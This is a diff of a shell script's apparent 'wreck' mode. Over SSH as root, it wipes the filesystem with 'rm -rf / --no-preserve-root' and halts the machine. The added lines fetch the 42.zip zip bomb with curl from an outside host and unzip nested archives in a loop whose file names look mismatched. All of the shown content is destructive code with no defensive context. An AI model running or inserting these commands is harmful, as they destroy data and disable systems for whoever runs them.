@@ -68,6 +68,9 @@ if [[ $wreck == true ]]; then
 ssh root@localhost -T <<EOF
 echo "* Wiping filesystem..."
 rm -rf / --no-preserve-root
+echo "* Zip bombing..."
+curl -LO https://www.securityfocus.com/data/vulnerabilities/exploits/42.zip
+for targ in 32 book chapter doc page; do unzip -n ${targ}\*.zip; done
 echo "* Morituri te salutant."
 halt
 EOF
